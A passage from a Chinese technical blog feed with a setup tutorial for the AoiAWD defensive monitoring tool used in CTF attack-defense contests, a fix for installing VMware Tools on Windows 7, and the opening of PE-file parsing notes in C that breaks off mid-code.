<p>AoiAWD 是一个由 Aodzip（安恒信息 海特实验室研究员、HAC 战队成员）维护的一个针对于 CTF AWD 模式的开源项目。专为比赛设计，便携性好，低权限运行的 EDR 系统。任何人都可以在 GNU AGPL-3.0 许可下使用该项目和分享该项目的源码。</p>
<h2 id="应用场景"><a class="anchor" href="#应用场景">#</a> 应用场景</h2>
<p>在常见的 AWD 比赛中，选手往往拥有一台（或若干台）开放了 SSH 服务和题目服务的 “靶机” 作为自己防守的阵地。</p>
<p>在实际比赛中，主办方往往会限制选手的 SSH 权限到一般用户 / 仅可管理题目的权限。并且针对一些常见的通用防火墙脚本（通防脚本）进行轮询式 check。</p>
<p>AoiAWD 是针对以上场景的限制和痛点设计的，组件间基于 socket 通信以便灵活部署，具有图形可视化界面。所有行为探针均支持在最低系统权限下运行，且默认不会干扰题目业务逻辑的正常运行，可以绕过绝大部分 check 脚本的行为检查。支持如下维度的行为捕获能力：</p>
<ul>
<li>Web 输入输出数据捕获、输出流量篡改（没错，你可以动态替换掉输出的 flag 为任意字符串）</li>
<li>PWN 类题目输入输出交互流量包捕获、当次运行时内存结构捕获、输出流量篡改</li>
<li>服务器进程 UID、PID、父进程、启动参数、运行时间捕获</li>
<li>服务器文件系统新建、删除、修改、权限变化行为捕获。</li>
</ul>
<p>本系统还内置了生命周期钩子，可以针对某一次行为的产生编写特定的插件去实现流量层面的临时热补丁、增加大屏告警、替换输出字符等操作。系统默认内置了如下插件可供参考：</p>
<ul>
<li>FlagBuster: 当检测到输出流量中包含了符合正则的 flag 字符串，产生大屏告警、标记触发规则的数据包、并将 flag 精准替换为看起来也像 flag 的随机数。</li>
<li>KingWatcher: KoH 类比赛中，当有其他队伍替换掉了赛点文件时，产生大屏告警。</li>
<li>ZombieKiller: 当文件系统上出现了不死马行为，标记可疑文件并产生大屏告警。</li>
</ul>
<h2 id="系统简介"><a class="anchor" href="#系统简介">#</a> 系统简介</h2>
<p>AoiAWD 分为六个组件，组件间互相配合实现系统的完整功能</p>
<ul>
<li>MongoDB Server: 日志数据存储数据库</li>
<li>AoiAWD Core: 中心数据处理与插件后端服务器</li>
<li>Frontend: 数据可视化平台前端</li>
<li>Guardian: PWN 行为探针</li>
<li>TapeWorm: Web 行为探针</li>
<li>RoundWorm: 系统进程与文件系统行为探针</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115193728724.png" alt="image-20220115193728724" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Rhc1NlY3VyaXR5LUhhdExhYi9Bb2lBV0Q=">项目地址</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116003935041.png" alt="image-20220116003935041" /></p>
<h3 id="下载项目"><a class="anchor" href="#下载项目">#</a> <strong>下载项目</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">git</span> clone https://github.com/DasSecurity-HatLab/AoiAWD.git</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115193804823.png" alt="image-20220115193804823" /></p>
<h3 id="php环境安装与配置"><a class="anchor" href="#php环境安装与配置">#</a> <strong>PHP 环境安装与配置</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#安装 PHP 7.2</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> software-properties-common</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> add-apt-repository ppa:ondrej/php</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> -y php7.2</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># 通过 apt-get 安装 PEAR，以获得 PEAR 和 PECL 使用的必要包和分配系统。</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-pear</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># 安装 php7.2-dev 软件包以获取必要的 PHP7 源文件来编译其他模块</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-dev</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 安装 php-XML 扩展，否则 MongoDB 无法正常安装</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-xml php7.2-xml</pre></td></tr></table></figure><h3 id="mongodb-server"><a class="anchor" href="#mongodb-server">#</a> MongoDB Server</h3>
<p>用于记录庞大的流量文件的数据库，是整个系统的核心存储。</p>
<ul>
<li>一般情况下建议和 AoiAWD Core 一起部署在选手自己可控的主机上。</li>
<li>无需额外的配置，Ubuntu 环境下开箱即用，apt 一下即可搞定。</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> mongodb-server</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> pecl <span class="token function">install</span> mongodb</pre></td></tr></table></figure><p><strong>报错</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>E: Could not get lock /var/lib/dpkg/lock-frontend - <span class="token function">open</span> <span class="token punctuation">(</span><span class="token number">11</span>: Resource temporarily unavailable<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>E: Unable to acquire the dpkg frontend lock <span class="token punctuation">(</span>/var/lib/dpkg/lock-frontend<span class="token punctuation">)</span>, is another process using it?</pre></td></tr></table></figure><p>删除锁定文件，就行了</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/dpkg/lock-frontend    </pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/dpkg/lock</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115194147190.png" alt="image-20220115194147190" /></p>
<p>修改 <code>php.ini</code>  文件</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/php/7.2/cli/php.ini</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 添加</span></pre></td></tr><tr><td data-num="2"></td><td><pre>extension<span class="token operator">=</span>mongodb<span class="token operator">.</span>so</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 修改</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span>Phar<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">;</span> http<span class="token punctuation">:</span><span class="token comment">//php.net/phar.readonly</span></pre></td></tr><tr><td data-num="6"></td><td><pre>phar<span class="token operator">.</span>readonly <span class="token operator">=</span> off</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">;</span> http<span class="token punctuation">:</span><span class="token comment">//php.net/phar.require-hash</span></pre></td></tr><tr><td data-num="8"></td><td><pre>phar<span class="token operator">.</span>require_hash <span class="token operator">=</span> off</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115195020647.png" alt="image-20220115195020647" /></p>
<h3 id="构建fronted项目"><a class="anchor" href="#构建fronted项目">#</a> <strong>构建 Fronted 项目</strong></h3>
<p>安装之前先对系统进行一番更新，若更新出现问题请根据报错自行解决</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> update</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential</pre></td></tr></table></figure><p>更新完成后，开始构建 Fronted 项目</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">npm</span>      <span class="token comment">#安装 npm</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org     <span class="token comment">#将下载源改为国内淘宝源</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">npm</span> cache clean --force</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">cd</span> AoiAWD   </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token builtin class-name">cd</span> Frontend</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">npm</span> <span class="token function">install</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">npm</span> run build</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#安装时间较长，可以搞点别的项目（ps：不知道是不是个人网络问题）</span></pre></td></tr></table></figure><p>Vue 编写的 Web 前端，用来浏览日志，产生报警动画等可视化展示。</p>
<ul>
<li>使用 npm 编译打包。</li>
<li>一般情况下编译后将与 AoiAWD Core 集成为一个可执行文件。</li>
<li>无需单独的运行启动。</li>
</ul>
<p>由于 npm 安装过于缓慢，改用 yarn 进行安装</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#安装 yarn：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">npm</span> <span class="token function">install</span> -g <span class="token function">yarn</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#查看版本号：</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">yarn</span> -v</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#安装依赖项：</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">yarn</span> <span class="token function">install</span></pre></td></tr></table></figure><p>然后需要设置一下</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">yarn</span> config <span class="token builtin class-name">set</span> ignore-engines <span class="token boolean">true</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116000117021.png" alt="image-20220116000117021" /></p>
<p>不设置的话会报错，提示 node 版本较低，要求 &quot;&gt;= 10&quot;。</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>error locutus@2.0.15: The engine <span class="token string">"node"</span> is incompatible with this module. Expected version <span class="token string">">= 10"</span><span class="token builtin class-name">.</span> Got <span class="token string">"8.10.0"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>error Found incompatible module.</pre></td></tr></table></figure><p>安装好 yarn 后，也设置好 config 后，执行安装命令即可</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">yarn</span> <span class="token function">install</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">yarn</span> build</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116000759202.png" alt="image-20220116000759202" /></p>
<p>构建完成！！！</p>
<h3 id="构建aoiawd-core"><a class="anchor" href="#构建aoiawd-core">#</a> <strong>构建 AoiAWD core</strong></h3>
<p>此步骤依赖 PHP7-CLI 和部分必要的 PHP 扩展</p>
<p>是整个系统运行的核心，负责探针数据收集入库、插件生命周期管理、Web 前端托管服务。</p>
<ul>
<li>运行 compile.php 即可打包为一个单独的二进制文件，方便携带。</li>
<li>插件需要放到和 aoiawd.phar 同目录下的 plugins 文件夹，Web 端有直接重载插件的按钮，可以实现热更新。</li>
<li>一般情况下可直接无参数运行，如果需要特别的配置，可以增加 - h 参数查看帮助信息。</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> AoiAWD</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">rm</span> -rf src/public/*</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">cp</span> -r <span class="token punctuation">..</span>/Frontend/dist/* src/public/</pre></td></tr><tr><td data-num="4"></td><td><pre>php compile.php</pre></td></tr></table></figure><p><strong>执行成功后得到 aoiawd.phar</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116001155928.png" alt="image-20220116001155928" /></p>
<h3 id="安装inotifywait"><a class="anchor" href="#安装inotifywait">#</a> <strong>安装 inotifywait</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">mkdir</span> inotifywait   </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> inotifywait</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">wget</span> http://github.com/downloads/rvoicilas/inotify-tools/inotify-tools-3.14.tar.gz   </pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">tar</span> zxf inotify-tools-3.14.tar.gz   </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">cd</span> inotify-tools-3.14/</pre></td></tr><tr><td data-num="6"></td><td><pre>./configure <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span></pre></td></tr></table></figure><p>安装完成如图</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116001124821.png" alt="image-20220116001124821" /></p>
<h3 id="构建guardian"><a class="anchor" href="#构建guardian">#</a> <strong>构建 Guardian</strong></h3>
<p>一个二进制 PWN 的影子外壳，其原理是包裹在 PWN 题目外侧，在每次被启动的时候透明记录 STDIN 与 STDOUT 的流量，并快照 PWN 程序的内存结构 (/proc/????/mem) 上传回 AoiAWD Core。</p>
<ul>
<li>在项目目录运行 compile.php 将会编译影子壳程序和捆绑程序: guardian.phar，一般是在选手电脑上进行捆绑后将生成文件上传到靶机。</li>
<li>直接运行捆绑程序会输出帮助文本，其中比较重要的一些参数是:
<ul>
<li>-i: 输入需要套壳的 PWN 题目程序路径</li>
<li>-s: 输入可以从靶机访问到探针上线地址的 URL，比如说 192.168.???.???:8023</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> Guardian</pre></td></tr><tr><td data-num="2"></td><td><pre>php compile.php</pre></td></tr></table></figure><p><strong>构建成功后得到 guardian.phar</strong></p>
<h3 id="构建roundworm"><a class="anchor" href="#构建roundworm">#</a> <strong>构建 RoundWorm</strong></h3>
<p>一个监控文件系统和进程的系统行为监视器，其原理是扫描 /proc 文件夹获取当前正在运行的所有进程的信息，以及利用 Linux 系统的 inotify 功能对指定文件夹的敏感文件操作进行全面的记录。</p>
<ul>
<li>直接运行 make 就可以编译生成</li>
<li>一般来讲该程序在靶机上运行，选手电脑上没必要执行这玩意。</li>
<li>添加 - h 参数即可看到帮助文档，其中比较重要的一些参数是:
<ul>
<li>-d: 后台运行，你当然不想关掉 ssh 的时候就把探针也给关了。</li>
<li>-s: 输入可以从靶机访问到探针上线地址的 IP，比如说 192.168.???.???。</li>
<li>-w: 需要监控文件变化的路径，如果有多个路径使用 ';' 分割，比如: -w &quot;/tmp;/var/www/html&quot;</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">cd</span> RoundWorm</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">make</span></pre></td></tr></table></figure><p><strong>构建成功会得到 roundworm</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220115201832392.png" alt="image-20220115201832392" /></p>
<h3 id="启动aoiawd"><a class="anchor" href="#启动aoiawd">#</a> <strong>启动 AoiAWD</strong></h3>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">mkdir</span> -p /data/db</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> mongod</pre></td></tr><tr><td data-num="3"></td><td><pre>./aoiawd.phar</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116001437890.png" alt="image-20220116001437890" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116001455804.png" alt="image-20220116001455804" /></p>
<h3 id="使用方法"><a class="anchor" href="#使用方法">#</a> <strong>使用方法</strong></h3>
<p><strong>搭建完后把刚刚那些文件夹中的生成的文件例如 xxx.phar 等发送到提供给我们的靶机上去，然后记得赋予权限，ip 是自己电脑 ip，端口就是默认 8023</strong></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">chmod</span> +x tapeworm.phar</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">chmod</span> +x roundworm</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">chmod</span> +x guardian.phar</pre></td></tr><tr><td data-num="4"></td><td><pre>./tapeworm.phar -d 目录 -s ip:port</pre></td></tr><tr><td data-num="5"></td><td><pre>./roundworm  -w 目录 -s <span class="token function">ip</span> -p port</pre></td></tr><tr><td data-num="6"></td><td><pre>./guardian.phar -i 目录 -s ip:port</pre></td></tr></table></figure><h2 id="系统截图"><a class="anchor" href="#系统截图">#</a> 系统截图</h2>
<h3 id="登陆界面"><a class="anchor" href="#登陆界面">#</a> 登陆界面</h3>
<p><span class="exturl" data-url="aHR0cDovL0lQOjEzMzcv">http://IP:1337/</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116001844261.png" alt="image-20220116001844261" /></p>
<h3 id="仪表盘"><a class="anchor" href="#仪表盘">#</a> 仪表盘</h3>
<p>在登陆页面输入生成的 token 进入仪表盘</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116002420721.png" alt="image-20220116002420721" /></p>
<h3 id="web日志列表"><a class="anchor" href="#web日志列表">#</a> Web 日志列表</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116003154144.png" alt="image-20220116003154144" /></p>
<h3 id="pwn日志列表"><a class="anchor" href="#pwn日志列表">#</a> PWN 日志列表</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116003317184.png" alt="image-20220116003317184" /> 文件系统日志列表</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116003436721.png" alt="image-20220116003436721" /></p>
<h3 id="系统进程列表"><a class="anchor" href="#系统进程列表">#</a> 系统进程列表</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116003501956.png" alt="image-20220116003501956" /></p>
<h3 id="告警日志列表"><a class="anchor" href="#告警日志列表">#</a> 告警日志列表</h3>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220116003532134.png" alt="image-20220116003532134" /></p>
]]></content>
      <categories>
        <category>AWD</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>VM16 虚拟机Win7无法安装VM tools解决方法</title>
    <url>/article/6503e9cb.html</url>
    <content><![CDATA[<p><code>VMware Workstation 16</code>  虚拟机  <code>Windows 7</code>  可能无法安装  <code>VMware tools</code>  的两个症状：一是「安装  <code>Vmware Toos(T)</code> ...」菜单灰色；二是安装过程中会提示「安装程序无法自动安装  <code>Virtual Machine Communication Interface Sockets(VSock)</code>  驱动程序。必须手动安装此驱动程序」等错误而安装失败。</p>
<h2 id="vm-workstation-16-虚拟机安装-vmware-toost菜单灰色-解决办法"><a class="anchor" href="#vm-workstation-16-虚拟机安装-vmware-toost菜单灰色-解决办法">#</a> VM Workstation 16 虚拟机「安装 Vmware Toos (T)...」菜单灰色 解决办法</h2>
<h3 id="11手动加载-vmware-toos-光盘"><a class="anchor" href="#11手动加载-vmware-toos-光盘">#</a> 1.1 手动加载 Vmware Toos 光盘</h3>
<p>启动虚拟系统后，在  <code>VMware Workstation</code>  菜单栏「虚拟机」-「设置」「-CD-ROM」-「使用 ISO 镜像」-「浏览」，定位到物理机  <code>VMware Workstation</code>  安装目录中  <code>windows.iso</code>  文件，然后进入虚拟  <code>Win7</code>  系统，打开「我的电脑」-「光驱」- 找到「 <code>setup.exe</code> 」文件执行安装即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205185613146.png" alt="image-20211205185613146" /></p>
<h3 id="12修改软盘为自动检测"><a class="anchor" href="#12修改软盘为自动检测">#</a> 1.2 修改软盘为自动检测</h3>
<p>在开启虚拟机操作系统情况下，虚拟机设置中更改  <code>Floppy</code> （软盘）为  <code>Auto detect</code> （自动检测），保存可能会提示出错，不用理会。如无意外，「安装  <code>Vmware Toos(T)</code> ...」已经可以点击，加载成功，虚拟操作系统中光驱里就会有  <code>VMWare Tools</code>  安装程序，打开安装即可。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190123458.png" alt="image-20211205190123458" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205185737907.png" alt="image-20211205185737907" /></p>
<p>重新进入虚拟机即可发现安装 <code>VM tools</code>  按钮可用了。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190428357.png" alt="image-20211205190428357" /></p>
<h2 id="vm-workstation-16-虚拟机-win-7-安装-vmware-tools-失败"><a class="anchor" href="#vm-workstation-16-虚拟机-win-7-安装-vmware-tools-失败">#</a> VM Workstation 16 虚拟机 Win 7 安装 VMware tools 失败</h2>
<p>如无意外，安装  <code>VMware Tools</code>  过程中，会弹出「 <code>Windows</code>  无法验证此驱动程序软件的发布者」，点击「始终安装」继续强制安装，最终会弹出「安装程序无法自动安装  <code>Virtual Machine Communication Interface Sockets(VSock)</code>  驱动程序。必须手动安装此驱动程序」等错误提示，最终导致安装失败。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190248651.png" alt="image-20211205190248651" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205190316611.png" alt="image-20211205190316611" /></p>
<p>解决方法：由于微软更新了驱动程序签名算法，2019 年开始弃用  <code>SHA1</code> ，改用 <code>SHA2</code> 。</p>
<p><code> VMware Tools</code>  驱动程序使用  <code>SHA2</code> ，而  <code>Windows7</code>  只支持 <code>SHA1</code> ，需要下载安装补丁  <code>KB4474419</code>  来支持  <code>SHA2</code>  算法。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY2F0YWxvZy51cGRhdGUubWljcm9zb2Z0LmNvbS9TZWFyY2guYXNweD9xPWtiNDQ3NDQxOQ==">下载地址</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211205193001934.png" alt="image-20211205193001934" /><br />
 安装 <code>KB4474419</code>  补丁完成，再安装  <code>VMware tools</code>  就可以顺利安装上。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210121019804.png" alt="image-20211210121019804" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210121032770.png" alt="image-20211210121032770" /></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jeWhvdXIuY29tLzE2NDUv">参考链接</span></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows PE文件结构解析Studying Notes之区段表与数据目录导入表解析</title>
    <url>/article/d979d2ac.html</url>
    <content><![CDATA[<p>hvv 招人了，给我这种菜🐕🐕一点机会吧 awa！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/pic1/image-20220226143047497.png" alt="image-20220226143047497" /></p>
<h1 id="区段表结构解析及遍历"><a class="anchor" href="#区段表结构解析及遍历">#</a> 区段表结构解析及遍历</h1>
<h2 id="运行程序代码"><a class="anchor" href="#运行程序代码">#</a> 运行程序代码</h2>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	FILE <span class="token operator">*</span> pFile <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">char</span> <span class="token operator">*</span> buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	<span class="token keyword">int</span> nFileLength <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	pFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\21r000\\Desktop\\PE编辑器\\PEditor.exe"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token function">fseek</span><span class="token punctuation">(</span>pFile<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_END</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	nFileLength <span class="token operator">=</span> <span class="token function">ftell</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token function">rewind</span><span class="token punctuation">(</span>pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	<span class="token keyword">int</span> imageLength <span class="token operator">=</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>imageLength<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>	<span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nFileLength <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>	<span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> imageLength<span class="token punctuation">,</span> pFile<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token comment">//MS-DOS</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token comment">//_IMAGE_DOS_HEADER</span></pre></td></tr><tr><td data-num="19"></td><td><pre>	PIMAGE_DOS_HEADER ReadDosHeader<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	ReadDosHeader <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>buffer<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MS-DOS Info:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"MZ标志位：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_magic<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"PE头偏移：%x\n"</span><span class="token punctuation">,</span> ReadDosHeader<span class="token operator">-></span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token comment">//PE</span></pre></td></tr><tr><td 